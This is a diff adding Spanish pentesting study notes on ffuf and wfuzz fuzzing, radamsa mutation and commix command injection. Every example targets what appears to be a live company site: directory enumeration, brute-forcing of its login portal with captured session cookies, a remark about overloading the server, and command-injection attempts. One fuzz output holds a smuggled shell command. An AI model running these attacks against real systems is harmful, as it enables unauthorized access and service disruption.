@@ -747,7 +747,8 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
                 https://github.com/projectdiscovery/nuclei
 
-                Util porque se puede integrar en un pipeline CI/CD
+                Util porque se puede integrar en un pipeline CI/CD, también se puede apuntar contra un host, 
+                no solo servicios http.
 
                 > nuclei -u https://cncintel.com -t nuclei-templates/cves/
 
@@ -787,6 +788,380 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
                  ⭐  ~  ok  at 18:18:43 >  
 
+            # Fuzzing básico. ffuz
+
+                Enviar parámetros de entrada raros, largos, para tratar de romper la aplicacion, 
+                o para encontrar recursos ocultos.
+
+                Como si le das a tu abuela el ordenador para que pruebe la app o se la dejas a un
+                ladrón para encontrar las joyas ocultas de un futbolista.
+
+                wfuz -> https://github.com/xmendez/wfuzz
+                Está en kali por defecto
+
+                ffuz -> https://github.com/ffuf/ffuf
+                También está en kali por defecto.
+
+                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
+
+                        /'___\  /'___\           /'___\       
+                       /\ \__/ /\ \__/  __  __  /\ \__/       
+                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                         \ \_\   \ \_\  \ \____/  \ \_\       
+                          \/_/    \/_/   \/___/    \/_/       
+
+                       v1.4.0-dev
+                ________________________________________________
+
+                 :: Method           : GET
+                 :: URL              : https://www.cncintel.com/FUZZING
+                 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
+                 :: Follow redirects : false
+                 :: Calibration      : false
+                 :: Timeout          : 10
+
+                Qué hace esto? va a coger cada una de las entradas de ese diccionario y las va a intercambiar por FUZZ, 
+                de manera que va a tratar de averiguar si alguna de estas está presente en el servidor victima.
+                Ojito que hay que poner siempre FUZZ. No vale poner algo distinto como FUZZING, FAFFING o lo que se te ocurra.
+                Muy importante, para que la salida sea lo más limpia posible, recomiendo limpiar los diccionarios con los comentarios.
+                He encontrado al lanzar esto por primera que la salida está sucia, pero Santiago muestra en su salida como aparece 
+                el INFO con la información adecuada.
+
+                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:4444
+
+                También puedo usar ffuf con un proxy de interceptación como Burp Suite. El del ejemplo usa uno creado escuchando en el puerto 4444.
+
+                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:4444
+
+                        /'___\  /'___\           /'___\       
+                       /\ \__/ /\ \__/  __  __  /\ \__/       
+                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                         \ \_\   \ \_\  \ \____/  \ \_\       
+                          \/_/    \/_/   \/___/    \/_/       
+
+                       v1.4.0-dev
+                ________________________________________________
+
+                 :: Method           : GET
+                 :: URL              : https://www.cncintel.com/FUZZ
+                 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+                 :: Follow redirects : false
+                 :: Calibration      : false
+                 :: Proxy            : http://127.0.0.1:4444
+                 :: Timeout          : 10
+                 :: Threads          : 40
+                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+
+                 > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x http://127.0.0.1:4444 -recursion
+
+                        /'___\  /'___\           /'___\       
+                       /\ \__/ /\ \__/  __  __  /\ \__/       
+                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                         \ \_\   \ \_\  \ \____/  \ \_\       
+                          \/_/    \/_/   \/___/    \/_/       
+
+                       v1.4.0-dev
+                ________________________________________________
+
+                 :: Method           : GET
+                 :: URL              : https://www.cncintel.com/FUZZ
+                 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+                 :: Follow redirects : false
+                 :: Calibration      : false
+                 :: Proxy            : http://127.0.0.1:4444
+                 :: Timeout          : 10
+                 :: Threads          : 40
+                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+                ________________________________________________
+
+                Con -recursion va a hacer una busqueda recursiva con los elementos encontrados, es decir, si al encontrar en el servidor el recurso
+                admin, luego va a hacer busquedas recursivas añadiendo palabras a /admin, como por ejemplo, /admin/user, /admin/root, etc...
+
+                Tambien puedo hacer busquedas recursivas por el servidor, en este caso estoy buscando ficheros con extension png.
+
+                > ffuf -u https://www.cncintel.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -recursion -e .png
+
+                        /'___\  /'___\           /'___\       
+                       /\ \__/ /\ \__/  __  __  /\ \__/       
+                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                         \ \_\   \ \_\  \ \____/  \ \_\       
+                          \/_/    \/_/   \/___/    \/_/       
+
+                       v1.4.0-dev
+                ________________________________________________
+
+                 :: Method           : GET
+                 :: URL              : https://www.cncintel.com/FUZZ
+                 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+                 :: Extensions       : .png 
+                 :: Follow redirects : false
+                 :: Calibration      : false
+                 :: Timeout          : 10
+                 :: Threads          : 40
+                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+                ________________________________________________
+
+                .png                    [Status: 403, Size: 139, Words: 3, Lines: 8, Duration: 242ms]
+                # Copyright 2007 James Fisher.png [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 421ms]
+                2006.png                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 641ms]
+                index.png               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 908ms]
+                news.png                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1091ms]
+                images.png              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1236ms]
+                crack.png               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1404ms]
+                download.png            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1551ms]
+
+                También puedo usar dos diccionarios a la vez.
+
+                > ffuf -u https://www.cncintel.com/W1/W2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:W1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt:W2
+
+                        /'___\  /'___\           /'___\       
+                       /\ \__/ /\ \__/  __  __  /\ \__/       
+                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                         \ \_\   \ \_\  \ \____/  \ \_\       
+                          \/_/    \/_/   \/___/    \/_/       
+
+                       v1.4.0-dev
+                ________________________________________________
+
+                 :: Method           : GET
+                 :: URL              : https://www.cncintel.com/W1/W2
+                 :: Wordlist         : W1: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+                 :: Wordlist         : W2: /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
+                 :: Follow redirects : false
+                 :: Calibration      : false
+                 :: Timeout          : 10
+                 :: Threads          : 40
+                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+                ________________________________________________
+
+                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 403ms]
+                    * W2: # directory-list-1.0.txt
+                    * W1: 11
+
+                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 585ms]
+                    * W1: # on at least 3 different hosts
+                    * W2: # directory-list-1.0.txt
+
+
+                Basicamente, ffuf nos permite cambiar palabras de diccionario e inyectarlas en el payload de una peticion rest.
+                Obviamente, para que esto tenga utilidad, la eleccion de los diccionarios es crucial.
+
+                Podriamos usarlo junto con burp suite para hacer ataques de fuerza bruta contra el usuario y contraseña de una página web, por ejemplo,
+                capturas con burp suite la peticion post a un servidor web, guardas esa peticion POST y luego usas ffuf tal que asi:
+
+                    ffuf -request request_post -u https://www.cncintel.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:User -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt:pass -x http://127.0.0.1:4444
+
+                Donde request_post tiene un contenido tal que asi:
+
+                    POST /client-portal/?ppage=login HTTP/2
+                    Host: cncintel.com
+                    Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
+                    Content-Length: 76
+                    Cache-Control: max-age=0
+                    Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+                    Sec-Ch-Ua-Mobile: ?0
+                    Sec-Ch-Ua-Platform: "Linux"
+                    Upgrade-Insecure-Requests: 1
+                    Origin: https://cncintel.com
+                    Content-Type: application/x-www-form-urlencoded
+                    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+                    Sec-Fetch-Site: same-origin
+                    Sec-Fetch-Mode: navigate
+                    Sec-Fetch-User: ?1
+                    Sec-Fetch-Dest: document
+                    Referer: https://cncintel.com/client-portal/?ppage=login
+                    Accept-Encoding: gzip, deflate
+                    Accept-Language: en-US,en;q=0.9
+
+                    username=User%40yahoo.com&password=atitelavoyadecir897&atmpt-login=
+
+                Cuando lanzas el comando, puedes ver las peticiones post que estás haciendo contra el servidor, por ejemplo:
+
+                    POST /client-portal/?ppage=login HTTP/2
+                    Host: cncintel.com
+                    User-Agent: Fuzz Faster U Fool v1.4.0-dev
+                    Content-Length: 74
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+                    Accept-Encoding: gzip, deflate
+                    Accept-Language: en-US,en;q=0.9
+                    Cache-Control: max-age=0
+                    Content-Type: application/x-www-form-urlencoded
+                    Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
+                    Origin: https://cncintel.com
+                    Referer: https://cncintel.com/client-portal/?ppage=login
+                    Scotland_99-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+                    Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+                    Sec-Ch-Ua-Mobile: ?0
+                    Sec-Ch-Ua-Platform: "Linux"
+                    Sec-Fetch-Dest: document
+                    Sec-Fetch-Mode: navigate
+                    Sec-Fetch-Scotland_99: ?1
+                    Sec-Fetch-Site: same-origin
+                    Upgrade-Insecure-Requests: 1
+
+                    username=scotland_99%40yahoo.com&password=atitelavoyadecir897&atmpt-login=
+
+                Es decir, está cambiando la palabra User que he indicado a ffuf para que la cambie por una palabra que aparece en dicho diccionario.
+                Ni que decir tiene que esta técnica la puedes usar con más palabras.
+
+                # ffuf and radamsa
+
+                    https://gitlab.com/akihe/radamsa
+
+                Se usan juntos para crear cadenas aleatorias partiendo de palabras de un diccionario, con radamsa, para así tratar de romper una aplicacion web. Literalmente radamsa es capaz
+                de generar cambios aleatorios a palabras que describes en un diccionario. Por ejemplo:
+
+                    > echo "Alonso is aironman and marcos is his nephew" | radamsa
+                    Alonso is airon m%s"xcalc$(xcalc)!!\x00%s&#000;%s%n\n!xcalc%#x$`\n%n$+&#000;\r$&%narcoʴs is��� his nephew
+
+                Ves el cambio que ha hecho radamsa? :)
+
+                Ejemplo completo, muestro el fichero request_post, fíjate en la parte donde pongo FUZZ, radamsa va a coger el contenido del fichero texto.txt
+                y ffuf va a generar 1000 peticiones con cada permutacion que radamsa genera. Ataque por fuerza bruta. Fíjate que el servidor responde con un 
+                200, en cuanto empiece a responder con un 404, el servidor está KO. Ahora imagina si es un ataque distribuido con una cadena de bots.
+
+                > cat request_post
+                POST /client-portal/?ppage=login HTTP/2
+                Host: cncintel.com
+                Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
+                Content-Length: 76
+                Cache-Control: max-age=0
+                Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+                Sec-Ch-Ua-Mobile: ?0
+                Sec-Ch-Ua-Platform: "Linux"
+                Upgrade-Insecure-Requests: 1
+                Origin: https://cncintel.com
+                Content-Type: application/x-www-form-urlencoded
+                User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+                Sec-Fetch-Site: same-origin
+                Sec-Fetch-Mode: navigate
+                Sec-Fetch-User: ?1
+                Sec-Fetch-Dest: document
+                Referer: https://cncintel.com/client-portal/?ppage=login
+                Accept-Encoding: gzip, deflate
+                Accept-Language: en-US,en;q=0.9
+
+                username=FUZZ&password=atitelavoyadecir897&atmpt-login=
+                > cat texto.txt | radamsa
+                texto aleatorio que pondrías como contenido del fichero de texto. 
+                > ffuf -request request_post  --input-cmd "cat texto.txt | radamsa"  -x http://127.0.0.1:4444 --input-num 1000
+
+                        /'___\  /'___\           /'___\       
+                       /\ \__/ /\ \__/  __  __  /\ \__/       
+                       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                         \ \_\   \ \_\  \ \____/  \ \_\       
+                          \/_/    \/_/   \/___/    \/_/       
+
+                       v1.4.0-dev
+                ________________________________________________
+
+                 :: Method           : POST
+                 :: URL              : https://cncintel.com/client-portal/?ppage=login
+                 :: Header           : Accept-Encoding: gzip, deflate
+                 :: Header           : Accept-Language: en-US,en;q=0.9
+                 :: Header           : Host: cncintel.com
+                 :: Header           : Origin: https://cncintel.com
+                 :: Header           : Content-Type: application/x-www-form-urlencoded
+                 :: Header           : Sec-Fetch-Site: same-origin
+                 :: Header           : Sec-Ch-Ua-Mobile: ?0
+                 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+                 :: Header           : Referer: https://cncintel.com/client-portal/?ppage=login
+                 :: Header           : Sec-Ch-Ua-Platform: "Linux"
+                 :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+                 :: Header           : Sec-Fetch-Mode: navigate
+                 :: Header           : Sec-Fetch-User: ?1
+                 :: Header           : Sec-Fetch-Dest: document
+                 :: Header           : Cookie: cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; _gid=GA1.2.1850043022.1662028773; _gcl_au=1.1.713478835.1662028776; _clck=p7xy1y|1|f4i|0; __adroll_fpc=54e037f9c5239227ae973267237ec766-1662028784312; _fbp=fb.1.1662028793630.898682734; cncintelligence-_zldp=2KLJQTWiriBy1Bqg09HReTst8tEn5IsF4aMIFcfepfVnHGPlNEqQMVeNgrtgDz89mKwM1K1ctjo%3D; cncintelligence-_zldt=2c750907-852d-4869-9a24-3fd12b9ad0aa-0; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; PHPSESSID=g6kk6jrrmbbjit53bt7a7620ul; _ga_RYRG09ZCZ0=GS1.1.1662028774.1.1.1662028845.53.0.0; _ga=GA1.1.1413900514.1662028773; _uetsid=5cc26ef029e211ed90d87b163005b053; _uetvid=5cc2984029e211ed97aad135b2b4f0fa; __ar_v4=NWF3JTWK3NBVJMNB56IC23%3A20220901%3A4%7CNMY525BHFZAZXBCDRGFTX3%3A20220901%3A4%7CWWRTINAMHJEPNEMYL32N3I%3A20220901%3A4; _clsk=1e2uguj|1662028846406|3|1|l.clarity.ms/collect
+                 :: Header           : Cache-Control: max-age=0
+                 :: Header           : Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
+                 :: Header           : Upgrade-Insecure-Requests: 1
+                 :: Data             : username=FUZZ&password=atitelavoyadecir897&atmpt-login=
+                 :: Follow redirects : false
+                 :: Calibration      : false
+                 :: Proxy            : http://127.0.0.1:4444
+                 :: Timeout          : 10
+                 :: Threads          : 40
+                 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+                ________________________________________________
+
+                2                       [Status: 200, Size: 62346, Words: 4444, Lines: 930, Duration: 520ms]
+                4                       [Status: 200, Size: 62384, Words: 4452, Lines: 930, Duration: 780ms]
+                1                       [Status: 200, Size: 62356, Words: 4446, Lines: 930, Duration: 1003ms]
+                6                       [Status: 200, Size: 62320, Words: 4439, Lines: 929, Duration: 1127ms]
+                3                       [Status: 200, Size: 62320, Words: 4440, Lines: 930, Duration: 1362ms]
+                12                      [Status: 200, Size: 62946, Words: 4578, Lines: 930, Duration: 1570ms]
+                14                      [Status: 200, Size: 62375, Words: 4450, Lines: 930, Duration: 1804ms]
+                16                      [Status: 200, Size: 62308, Words: 4439, Lines: 929, Duration: 2032ms]
+                7                       [Status: 200, Size: 62394, Words: 4453, Lines: 930, Duration: 2499ms]
+                25                      [Status: 200, Size: 62352, Words: 4446, Lines: 929, Duration: 2442ms]
+                29                      [Status: 200, Size: 62440, Words: 4460, Lines: 932, Duration: 2726ms]
+                5                       [Status: 200, Size: 78941, Words: 7085, Lines: 1308, Duration: 3159ms]
+                37                      [Status: 200, Size: 62354, Words: 4445, Lines: 931, Duration: 3182ms]
+                40                      [Status: 200, Size: 63762, Words: 4672, Lines: 962, Duration: 3438ms]
+                8                       [Status: 200, Size: 62338, Words: 4445, Lines: 930, Duration: 3913ms]
+                11                      [Status: 200, Size: 62422, Words: 4458, Lines: 931, Duration: 4142ms]
+                9                       [Status: 200, Size: 62408, Words: 4446, Lines: 930, Duration: 4483ms]
+                15                      [Status: 200, Size: 62353, Words: 4447, Lines: 930, Duration: 4704ms]
+                32                      [Status: 200, Size: 62353, Words: 4447, Lines: 930, Duration: 4742ms]
+                55                      [Status: 200, Size: 62357, Words: 4447, Lines: 930, Duration: 4385ms]
+                51                      [Status: 200, Size: 62351, Words: 4446, Lines: 930, Duration: 4731ms]
+                [WARN] Caught keyboard interrupt (Ctrl-C)
+
+
+
+                 ⭐  ~  ok  took 6s  at 15:58:11 >      
+
+    # Explotacion
+
+        # Commix
+
+        https://github.com/commixproject/commix
+
+        Command injection tool. Using burp suite proxy listening in 4444 port.
+
+        > commix -u http://www.cncintel.com --proxy http://127.0.0.1:4444 --level 3
+                                      __           
+           ___   ___     ___ ___     ___ ___ /\_\   __  _   
+         /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v3.5-dev#60
+        /\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+        \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
+         \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)
+
+        +--
+        Automated All-in-One OS Command Injection Exploitation Tool
+        Copyright © 2014-2022 Anastasios Stasinopoulos (@ancst)
+        +--
+
+        (!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+
+        [info] Testing connection to the target URL.  
+        Got a 301 redirect to https://cncintel.com/
+        Do you want to follow the identified redirection? [Y/n] > n
+        [info] Performing identification checks to the target URL.
+        Do you recognise the server's operating system? [(W)indows/(U)nix-like/(q)uit] > U
+        [warning] The HTTP Cookie header is not provided, so this test is going to be skipped.
+        [critical] Unable to connect to the target URL (HTTP Error 403: Forbidden).
+        [info] Setting the HTTP header 'User-Agent' for tests.
+        ^C 
+        [error] User aborted procedure during the detection phase (Ctrl-C was pressed).
+
+
+         ⭐  ~  INT  took 2m 17s  at 16:35:27 > 
+
+        La forma de saltarse la autentificacion y tratar de capturar algún campo en el que podamos inyectar comandos, es usar el parametro --cookie para pasar un usuario que se pueda autentificar y luego usar el parametro --data con el parámetro que hayamos detectado con burp proxy para ver si se puede inyectar.
+
+        commix -u http://www.cncintel.com --proxy http://127.0.0.1:4444 --cookie="LA COOKIE QUE TE PERMITA ENTRAR EN EL SISTEMA AUTENTIFICADO" --data="EL PARAMETRO AL QUE QUIERES inyectar comandos"
+
+        commix tratará de inyectar payloads, como por ejemplo concatenando comandos como eval(phpinfo();)...
+        Si la respuesta es correcta, commix te proporcionará una shell contra el servidor vulnerable donde podrás lanzar comandos.
 
 
 # Bypass a Web application Firewall, like CloudFlare...
